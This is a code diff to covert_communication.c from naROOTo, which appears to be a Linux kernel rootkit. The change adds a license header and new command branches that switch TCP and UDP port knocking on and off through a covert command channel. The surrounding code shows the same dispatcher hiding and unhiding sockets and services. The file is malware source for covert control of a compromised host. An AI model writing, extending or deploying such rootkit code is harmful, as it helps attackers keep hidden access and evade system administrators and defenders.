@@ -1,6 +1,26 @@
-/*
+/******************************************************************************
+ *
+ * Name: covert_communication.c 
  * All functionality needed for the covert communication channel.
+ *
+ *****************************************************************************/
+/*
+ * This file is part of naROOTo.
+
+ * naROOTo is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+
+ * naROOTo is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+
+ * You should have received a copy of the GNU General Public License
+ * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
  */
+
 #include <linux/inet.h>
  
 #include "control.h"
@@ -90,6 +110,30 @@ execute_command (void)
 		if(param_counter > 0) {
 			port = convert_atoi(param_buffer);
 			unhide_udp_socket(port);
+		}
+		
+	} else if(strcmp(command_buffer, "enable_knocking_tcp") == 0) {
+		if(param_counter > 0) {
+			port = convert_atoi(param_buffer);
+			enable_knocking_tcp(port);
+		}
+		
+	} else if(strcmp(command_buffer, "disable_knocking_tcp") == 0) {
+		if(param_counter > 0) {
+			port = convert_atoi(param_buffer);
+			disable_knocking_tcp(port);
+		}
+		
+	} else if(strcmp(command_buffer, "enable_knocking_udp") == 0) {
+		if(param_counter > 0) {
+			port = convert_atoi(param_buffer);
+			enable_knocking_udp(port);
+		}
+		
+	} else if(strcmp(command_buffer, "disable_knocking_udp") == 0) {
+		if(param_counter > 0) {
+			port = convert_atoi(param_buffer);
+			disable_knocking_udp(port);
 		}
 		
 	} else if(strcmp(command_buffer, "hide_service") == 0) {
